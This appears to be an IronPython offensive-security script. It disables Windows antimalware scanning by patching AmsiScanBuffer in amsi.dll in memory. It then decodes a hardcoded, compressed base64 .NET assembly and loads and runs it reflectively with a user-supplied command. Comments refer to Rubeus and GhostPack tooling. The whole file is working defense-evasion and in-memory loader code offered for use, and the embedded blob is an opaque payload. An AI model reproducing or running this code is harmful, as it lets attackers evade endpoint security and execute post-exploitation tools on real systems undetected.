/tIf8t/F98K9DwAbvnbKhk9CfxFHwSX0Mxx7JYsjdA7jWfRngYMmwjv/j5+WHKFD5pQd80M3xhv+bjhvkS9uZ/nus7Vnyk+3Ih3mpdpLEOdUGp/pcXrpLzAA0Y51fq8kmeeJu5eEc2N8p8A+bg9n/8Y5kWOR6EmzTgy22rsnNkmA73e3vhmg/ZZdSO15DmC9QU+ZrtkrknVSzHGsjhDm934NYN8q2pr0zqEAzsIwljkHlM96NN4KdpLD4Pv0Ja5HL4/AM3TE/tbC6j7KbdCWkwfn1GnF/n5kurZIcT0v2PLKtp5OO/W/6nuM29HaN1P5/0bqHbb22k/i9uvM223FbhvKvMw0WGeAK3xl1OpdmveUe/AJ4Jun0/54+z41tV7RSNMee0Qcn0RC9WJVLeurafFifjYii8SsK7qqaFWdpsUWNcWpyaHQUCil2NBqBEXoZlpsGPqEWSzRimJGKg76X6RYrUwoZiXaTIikoujlFWo6OFdWfSiMEFdYVqV6vVxvdejELpEwsL20eL41Xatp5SIHPYsqtZoYsyTUjYZZZ4Bo/6hP0qoZS5q02DCwTjuOHIOuNVBPqs4Z5WZZo6vU/Eepx0VXilcOjnnFBtP4HG1SjWjMT4uKmdWb1WvUEEmjPF1kSF5pcUXRTGo3iguJ9dHGUT3WoXsq5hoB46mYY9RJ2Dx6ZOEux8c2UYct2jT6DXDNScc="


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("scout.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()